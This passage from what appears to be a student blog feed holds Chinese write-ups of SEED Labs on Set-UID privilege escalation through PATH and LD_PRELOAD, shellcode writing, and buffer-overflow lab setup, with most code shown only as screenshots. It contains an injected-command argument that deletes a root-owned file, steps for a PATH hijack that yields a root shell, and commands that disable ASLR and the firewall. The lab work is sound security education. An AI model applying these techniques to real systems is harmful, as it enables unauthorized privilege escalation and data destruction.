alt=""></p></li><li><p>编译并运行得到当前进程的环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101013626.png" alt=""></p></li></ol><hr><h4 id="Task-5-Environment-Variable-and-Set-UID-Programs"><strong>Task 5: Environment Variable and</strong> Set-UID <strong>Programs</strong></h4><p>探究环境变量是否由Set-UID程序的进程从用户的进程中继承</p><p>Set-UID程序：指所有执行该程序时以root权限执行。</p><ol><li><p>创建<code>task5.c</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101021060.png" alt=""></p></li></ol><hr><h5 id="Step-1-编译运行示例代码，打印当前进程的所有环境变量">Step 1. 编译运行示例代码，打印当前进程的所有环境变量</h5><ol><li><p>编译后运行，得到该进程所有的环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226121907671.png" alt=""></p></li></ol><hr><h5 id="Step-2-更改所有权为root，使其成为一个Set-UID程序">Step 2. 更改所有权为root，使其成为一个Set-UID程序</h5><ol><li><p>将所有权更改为Root账户，使用chown命令；</p><p>使用chmod命令，即可成为Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101028267.png" alt=""></p></li><li><p>将<code>task5</code>与<code>task4</code>的属性进行对比，可以发现已经得到了一个Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101034206.png" alt=""></p></li></ol><hr><h5 id="Step-3-在普通用户Shell中设置环境变量并运行Set-UID程序">Step 3. 在普通用户Shell中设置环境变量并运行Set-UID程序</h5><ol><li><p>设置环境变量PATH：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101039315.png" alt=""></p></li><li><p>设置环境变量LD_LIBRARY_PATH：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101044751.png" alt=""></p></li><li><p>设置环境变量name：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101050028.png" alt=""></p></li><li><p>运行Set-UID程序<code>task5</code>，输出当前的环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101057000.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101103593.png" alt=""></p><p>可以看到PATH和name环境变量，但是看不到LD_LIBRARY_PATH；</p><p><strong>原理：</strong><code>LD_LIBRARY_PATH</code>是在查找指定动态链接库时，除了默认路径以外的其他路径。若其可以被修改，就可能加载攻击者的恶意库，所以为了使Set-UID程序更加安全，运行时的加载器会忽略此环境变量。</p></li></ol><hr><h4 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><strong>Task 6: The PATH Environment Variable and</strong> Set-UID <strong>Programs</strong></h4><p><em>这里换成了seed-ubuntu，因为发现用自己的ubuntu做不出来</em></p><ol><li><p>先把改成/bin/zsh</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101110739.png" alt=""></p></li><li><p>创建<code>task6.c</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101115762.png" alt=""></p></li><li><p>添加/bin/seed加入环境变量PATH：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101121987.png" alt=""></p></li><li><p>使用chown和chmod命令，将<code>task6</code>设置为Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101127600.png" alt=""></p></li><li><p>编译运行<code>task6</code>文件，即运行<code>ls</code>命令：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101132546.png" alt=""></p></li><li><p>修改环境变量，使得system调用shell执行自己设定的程序，即创建一个名为<code>ls</code>的可执行文件，执行时，shell自定义：</p><p>创建<code>hello.c</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101138597.png" alt=""></p></li><li><p>编译得到为<code>ls</code>的可执行文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101145371.png" alt=""></p></li><li><p>将当前可执行文件<code>ls</code>的路径加入PATH环境变量中：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101220905.png" alt=""></p></li><li><p>执行<code>task6</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101226297.png" alt=""></p><p>得到了<code>Hello world!</code></p><p>也就是说，虽然shell中执行的是<code>ls</code>命令，但执行了自己设定的可执行文件中的命令。</p></li><li><p>将/bin/sh程序复制到/tmp目录中，重命名为ls</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101232421.png" alt=""></p></li><li><p>将/tmp加入PATH环境变量，先使用/tmp中的sh</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101239188.png" alt=""></p></li><li><p>运行<code>task6</code>后，即使以普通用户身份，也能得到root权限</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101243678.png" alt=""></p></li></ol><hr><h4 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><strong>Task 7: The</strong> LD PRELOAD <strong>Environment Variable and</strong> Set-UID <strong>Programs</strong></h4><h5 id="Step-1-构建一个动态链接库">Step 1. 构建一个动态链接库</h5><ol><li><p>创建<code>mylib.c</code>文件，并编译</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101249355.png" alt=""></p></li><li><p>设置LD_PRELOAD环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101254067.png" alt=""></p></li><li><p>创建<code>myprog.c</code>文件，并编译</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101258930.png" alt=""></p></li></ol><hr><h5 id="Step-2-四个不同场景中运行myprog可执行文件">Step 2. 四个不同场景中运行myprog可执行文件</h5><h6 id="场景一：普通用户">场景一：普通用户</h6><ol><li><p>正常打印</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101310217.png" alt=""></p></li></ol><h6 id="场景二：将myprog设置为Set-UID根程序，普通用户执行">场景二：将myprog设置为Set-UID根程序，普通用户执行</h6><ol><li><p>sleep1秒后退出</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101318790.png" alt=""></p></li></ol><h6 id="场景三：将myprog设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后">场景三：将myprog设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后</h6><ol><li><p>若为root：正常打印</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101327037.png" alt=""></p></li><li><p>若为普通用户：sleep1秒后退出</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101335818.png" alt=""></p></li></ol><h6 id="场景四：将myprog设置为Set-UID-user1程序，并在seed用户下设置环境变量">场景四：将myprog设置为Set-UID user1程序，并在seed用户下设置环境变量</h6><ol><li><p>创建新用户user1：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101347750.png" alt=""></p></li><li><p>在seed下运行myprog：</p><p>设置myprog以及环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101355098.png" alt=""></p><p>执行后发现sleep1秒后退出：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101403401.png" alt=""></p></li></ol><hr><h5 id="Step-3-设计实验">Step 3. 设计实验</h5><p>**猜测：**myprog会从用户进程中继承环境变量，但是由于动态链接器的保护机制，并不会继承LD_PRELOAD环境变量。</p><p>**设计思路：**在上述四种场景中，打印出用户进程和子进程的环境变量，关注其LD_PRELOAD环境变量的不同。</p><h6 id="场景一：普通用户-v2">场景一：普通用户</h6><ol><li><p>设置LD_PRELOAD环境变量为自己的动态链接库</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101409430.png" alt=""></p></li><li><p>编辑<code>task7.c</code>文件，打印子进程的环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101415712.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101421492.png" alt=""></p></li><li><p>编译后执行，并将输出存为<code>child_seed.txt</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101428657.png" alt=""></p></li><li><p>编辑<code>task7.c</code>文件，打印父进程的环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101440992.png" alt=""></p></li><li><p>编译后执行，并将输出存为<code>parent_seed.txt</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101508453.png" alt=""></p></li><li><p>发现两个输出文件没有差别：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101514719.png" alt=""></p></li><li><p>并且可以发现二者输出的环境变量中都有LD_PRELOAD环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101520479.png" alt=""></p></li></ol><p>**说明：**子进程继承了用户进程的LD_PRELOAD环境变量。</p><hr><h6 id="场景二：将task7设置为Set-UID根程序，普通用户执行">场景二：将task7设置为Set-UID根程序，普通用户执行</h6><ol><li><p>task7设置为Set-UID根程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101527376.png" alt=""></p></li><li><p>编辑<code>task7.c</code>，为输出子进程环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101533237.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101538599.png" alt=""></p></li><li><p>编译后，得到<code>task7</code>可执行文件，并将其设置为Set_UID程序</p><p>将其执行后存为<code>child_seed_set_uid.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101545679.png" alt=""></p></li><li><p>编辑<code>task7.c</code>，为输出父进程环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101559992.png" alt=""></p></li><li><p>编译后执行，不将执行文件设置为Set_UID程序，并将输出文件存为<code>parent_seed.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101608413.png" alt=""></p></li><li><p>发现只有父进程中有LD_PRELOAD环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101615841.png" alt=""></p></li></ol><p>说明：对比后发现，两个输出文件有差别，即子进程没有继承父进程中的环境变量。</p><hr><h6 id="场景三：将task7设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后">场景三：将task7设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后</h6><p><strong>在root下：</strong></p><ol><li><p>root下设置环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101622469.png" alt=""></p></li><li><p>设置为输出子进程环境变量，并将可执行文件设置为Set_UID程序</p><p>将输出存为<code>child_root.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101627727.png" alt=""></p></li><li><p>设置为输出父进程环境变量</p><p>将输出存为<code>parent_root.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101633612.png" alt=""></p></li><li><p>对比发现两个输出文件没有差别：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101639725.png" alt=""></p></li></ol><p>**说明：**发现此时二者的环境变量一致，二者都有LD_PRELOAD环境变量。</p><p><strong>在普通用户下</strong>：</p><ol><li><p>设置root环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101646522.png" alt=""></p></li><li><p>普通用户下，输出子进程，并设置为Set_UID程序，输出存为<code>child_root_set_uid.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101652071.png" alt=""></p></li><li><p>普通用户下，输出父进程，输出存为<code>parent_root_2.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101657671.png" alt=""></p></li></ol><p>**说明：**对比发现两个输出文件有差别，即子进程没有继承父进程的环境变量。</p><p>场景三中：</p><p>若在root用户下运行，子进程会继承父进程的环境变量；</p><p>而在seed用户下运行，子进程则不会继承父进程的环境变量。</p><hr><h6 id="场景四：将task7设置为Set-UID-user1程序，并在seed用户下设置环境变量">场景四：将task7设置为Set-UID user1程序，并在seed用户下设置环境变量</h6><ol><li><p>设置环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101703412.png" alt=""></p></li><li><p>输出子进程，并设置为user1的Set_UID程序，输出存为<code>child_user1.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101709799.png" alt=""></p></li><li><p>输出父进程，输出存为<code>parent_user1.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101715142.png" alt=""></p></li><li><p>对比两个输出文件，发现子进程未继承父进程的环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101722191.png" alt=""></p></li></ol><p>**说明：**场景四中子进程未继承父进程的LD_PRELOAD环境变量。</p><hr><h5 id="解释：">解释：</h5><p>场景一中，普通用户下执行myprog程序，此时普通用户为myprog程序的拥有者，而且在普通用户下设置了环境变量，所以真实用户ID与拥有者用户ID一致，子进程会继承seed用户下的环境变量，并加入共享库；</p><p>场景二中，myprog为Set-UID 程序，在普通用户下执行，ID不一致，所以动态链接器会忽略LD_PRELOAD环境变量，子进程不能继承seed用户下的LD*环境变量；</p><p>场景三中，myprog为Set-UID 根程序，并在Root用户下设置了环境变量，所以在root用户下运行myprog，ID一致，所以子进程会继承root用户下的LD_PRELOAD环境变量，并加入共享库；而在普通用户下运行，ID则会不匹配，环境变量被忽略；</p><p>场景四中，myprog为Set-UID user1程序，在seed用户下执行也会遇到ID不一致，所以忽略环境变量。</p><hr><h4 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><strong>Task 8: Invoking External Programs Using</strong> system() <strong>versus</strong> execve()</h4><p>任务：将system()与execve()在Set-UID程序下执行，观察其对系统文件的危害行为</p><h6 id="Step1-使用system-调用外部程序，删除根用户拥有的文件">Step1. 使用system()调用外部程序，删除根用户拥有的文件</h6><ol><li><p>编辑<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101728217.png" alt=""></p></li><li><p>进入root，创建<code>home1</code>目录，创建<code>hello.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101735604.png" alt=""></p></li><li><p>退出root，在普通用户下，删除<code>hello.c</code>文件，失败：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101741107.png" alt=""></p></li><li><p>返回原文件夹，执行下命令，成功删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./task8 <span class="hljs-string">&quot;home1/hello.c;rm home1/hello.c&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101746142.png" alt=""></p></li></ol><hr><h6 id="Step-2-使用execve-调用外部程序">Step 2. 使用execve()调用外部程序</h6><ol><li><p>修改<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101751748.png" alt=""></p></li><li><p>编译<code>task8.c</code>文件，并设置为Set_UID程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101758217.png" alt=""></p></li><li><p>在root下创建<code>/home/hello.c</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101804474.png" alt=""></p></li><li><p>返回原文件夹，执行下命令，删除失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./task8 <span class="hljs-string">&quot;home1/hello.c;rm home1/hello.c&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101826900.png" alt=""></p></li></ol><p>使用system()可以成功删除不可写文件，是因为system会创建一个子进程，子进程调用一个新的shell程序，而且task8是一个Set-UID根程序，在执行时会以root权限执行删除文件的命令，可以成功删除。</p><p>使用execve()不可以成功删除不可写文件，因为execve会执行一个新程序，而不会调用新的shell程序，将输入的参数仅仅当成一个字符串，不会执行命令，所以不能删除不可写文件。</p><hr><h4 id="Task-9-Capability-Leaking"><strong>Task 9: Capability Leaking</strong></h4><ol><li><p>root下，创建一个<code>etc</code>文件夹，文件夹内创建<code>test.txt</code>文件，并设置其权限为0644：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101832873.png" alt=""></p></li><li><p>返回普通用户，在原文件夹编辑<code>task8.c</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101838508.png" alt=""></p></li><li><p>编译文件，设置<code>task8</code>为Set_UID程序：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101844555.png" alt=""></p></li><li><p>回到<code>/etc</code>文件夹，将恶意代码写入了<code>test.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101849127.png" alt=""></p></li></ol><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 5</title>
    <link href="/2024/12/26/lab5/"/>
    <url>/2024/12/26/lab5/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 5-shellcode编写实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="Task-1-Writing-Shellcode">Task 1: Writing Shellcode</h4><h5 id="Task-1-a-The-Entire-Process">Task 1.a: <strong>The Entire Process</strong></h5><ol><li><p>首先，安装 nasm，用于对汇编语言文件进行反汇编：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100036222.png" alt=""></p></li><li><p>使用nasm反汇编<code>mysh.s</code>文件，得到<code>mysh.o</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100043592.png" alt=""></p></li><li><p>使用<code>ld</code>命令编译，得到可执行代码<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100048782.png" alt=""></p></li><li><p>运行<code>mysh</code>，可以得到一个shell：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100054804.png" alt=""></p></li><li><p>输出这个shell的进程ID为<code>11300</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100059997.png" alt=""></p></li><li><p>若新开一个终端，可以发现进程ID是不同的，输出为<code>11303</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100107665.png" alt=""></p></li><li><p>使用<code>objdump</code>命令以英特尔模式生成<code>mysh.o</code>的汇编代码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100112896.png" alt=""></p></li><li><p>使用xxd命令打印出二进制文件，即可得到shellcode的机器码，以<code>31c0</code>开头，<code>cd80</code>结尾：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100119536.png" alt=""></p></li><li><p>修改<code>convert.py</code>文件，将<code>ori_sh</code>变量中的值替换为上图中的机器码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100126653.png" alt=""></p></li><li><p>运行<code>convert.py</code>，得到shellcode中包含的16进制形式的机器码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100133646.png" alt=""></p></li></ol><hr><h5 id="Task-1-b-Eliminating-Zeros-from-the-Code">Task 1.b: <strong>Eliminating Zeros from the Code</strong></h5><p>要求运行：<code>/bin/bash</code></p><ol><li><p>修改<code>mysh.s</code>如下，按照倒序对<code>/bin/bash</code>和4 bytes对齐进行入栈，入栈顺序为<code>h</code>, <code>/bas</code>, <code>/bin</code>；</p><p>入栈为<code>h</code>时不够4 bytes，则对高位进行补0，但要求不能出现0，所以直接对<code>al</code>赋值：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100142133.png" alt=""></p></li><li><p>得到SHELL环境变量为<code>/bin/bash</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100148638.png" alt=""></p></li></ol><hr><h5 id="Task-1-c-Providing-Arguments-for-System-Calls">Task 1.c: <strong>Providing Arguments for System Calls</strong></h5><p>要求运行： <code>/bin/sh -c &quot;ls -la&quot;</code></p><ol><li><p>修改<code>mysh.s</code>：</p><p>在栈中压入<code>/bin//sh</code>后，将栈顶指针地址移动到ebx寄存器，即将该参数其地址存储在ebx；</p><p>在栈中压入<code>-c</code>后，将栈顶指针地址移动到edx寄存器，即将该参数其地址存储在edx；</p><p>在栈中压入<code>ls -la</code>后，将栈顶指针地址移动到ecx寄存器，即将该参数其地址存储在ecx；</p><p>然后，再将<code>args</code>列表压入栈中，将栈顶指针esp移动到ecx寄存器作为系统调用参数二，完成args的传递；同时args[0]，即path的地址已经在ebx寄存器中，也已放在了ebx寄存器中，因此path的传递也完成了。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100156586.png" alt=""></p></li><li><p>编译<code>mysh.s</code>，得到<code>mysh.o</code> 和<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100204309.png" alt=""></p></li><li><p>执行<code>./mysh</code>，得到溢出结果：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100210004.png" alt=""></p></li></ol><hr><h5 id="Task-1-d-Providing-Environment-Variables-for-execve">Task 1.d: <strong>Providing Environment Variables for</strong> <strong>execve()</strong></h5><ol><li><p>修改<code>mysh.s</code>：</p><p>将execve系统调用的path设置为<code>/usr/bin/env</code>；</p><p>args设置为<code>&#123; &quot;/usr/bin/env&quot;, NULL &#125;</code>；</p><p>envs设置为<code>&#123; &quot;aaa=1234&quot;, &quot;bbb=5678&quot;, &quot;cccc=1234&quot;, NULL &#125;</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100216855.png" alt=""></p></li><li><p>编译<code>mysh.s</code>，得到<code>mysh.o</code> 和<code>mysh</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100224003.png" alt=""></p></li><li><p>执行<code>./mysh</code>，得到执行结果：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100232397.png" alt=""></p></li></ol><hr><h4 id="Task-2-Using-Code-Segment">Task 2: <strong>Using Code Segment</strong></h4><ol><li><p>修改<code>mysh2.s</code>，通过获取所有必要数据结构的地址来完成汇编语言的编程：</p><p>类似执行<code>/usr/bin/env*AAAABBBBa=11*b=22*CCCCDDDDEEEE</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100239826.png" alt=""></p></li><li><p>编译得到<code>mysh2.o</code>文件，并使用 --omagic 选项得到<code>mysh2</code>可执行文件，这样代码段才是可写的：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100247447.png" alt=""></p></li><li><p>执行<code>mysh2</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100255372.png" alt=""></p></li></ol><hr><h4 id="Task-3-Writing-64-bit-Shellcode">Task 3: <strong>Writing 64-bit Shellcode</strong></h4><ol><li><p>查看<code>mysh_64.s</code>文件，与编写 32 位 shellcode 相似，但在64位架构中，调用系统调用通过<code>syscall</code>指令完成，系统调用的前三个参数分别存储在 rdx、rsi 和 rdi 寄存器中：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100302124.png" alt=""></p></li><li><p>修改编译命令，得到<code>mysh_64.o</code>文件，以及<code>mysh_64</code>可执行文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100308721.png" alt=""></p></li><li><p>运行<code>mysh_64</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100315468.png" alt=""></p></li><li><p>查看SHELL环境变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100320964.png" alt=""></p></li></ol><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 4</title>
    <link href="/2024/12/26/lab4/"/>
    <url>/2024/12/26/lab4/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 4-缓冲区溢出攻击实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="环境部署">环境部署</h4><h5 id="准备docker">准备docker</h5><p><font color='orange'>*这里因为我已经下好docker了，所以只是验证一下，没有配置docker请看<a href="#section1">第3步</a></font></p><ol><li><p>下载<code>handsonsecurity.tar</code>，使用离线方法，加载docker镜像；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i handsonsecurity.tar<br>Loaded image: handsonsecurity/seed-ubuntu:small<br></code></pre></td></tr></table></figure><p>验证一下，发现已经加载成功了；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094910252.png" alt=""></p></li><li><p>返回<code>Labsetup</code>文件夹，使用命令开启docker；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ..<br>docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094914901.png" alt=""></p><p>已经建立连接了；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094920747.png" alt=""></p></li><li><p><a id="section1"><font color='orange'>*注：查看一下docker是否成功挂载：</font></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl status docker<br></code></pre></td></tr></table></figure><p><font color='orange'><a href="http://xn--docker-hp7i560bx1m5kmnuwnsbk36aru6af60ejem.io">如果没有反应的话下载docker.io</a>（自行搜索一下）</font><font color='orange'>（记得换源之后下载）</font></p></li></ol><hr><h5 id="准备server">准备server</h5><p><font color='orange'>*先尝试能不能直接<code>make</code>，如果可以就跳过第一步；因为我设置的默认gcc不是gcc-9，所以这里修改了一下<code>Makefile</code></font></p><ol><li><p>进入<code>server-code</code>文件夹，修改<code>Makefile</code>中指定的32位gcc版本；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094927250.png" alt=""></p></li><li><p><code>make</code>一下，成功了；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094934133.png" alt=""></p><p><code>ls</code>后，发现编译完成了；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094940547.png" alt=""></p></li><li><p><code>make install</code>安装一下；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094949143.png" alt=""></p></li></ol><hr><h5 id="准备环境">准备环境</h5><ol><li><p>关闭防火墙：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ufw disable<br></code></pre></td></tr></table></figure></li><li><p>关闭ALSR(地址空间随机化)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure></li></ol><p><strong>至此，准备工作完成了！</strong></p><hr><h4 id="Task1-熟悉shellcode">Task1: 熟悉shellcode</h4><ol><li><p>进入<code>shellcode</code>文件夹，运行<code>shellcode_32.py</code>和<code>shellcode_64.py</code>两个文件，得到<code>codefile_32</code>和<code>codefile_64</code>两个输出文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094955159.png" alt=""></p></li><li><p>修改一下<code>Makefile</code>文件中的gcc版本；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095000591.png" alt=""></p></li><li><p>使用<code>make</code>编译<code>call_shellcode.c</code>文件成功；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095008031.png" alt=""></p></li><li><p>测试一下两个输出文件；</p><p><code>a32.out</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095013235.png" alt=""></p><p><code>a64.out</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095019070.png" 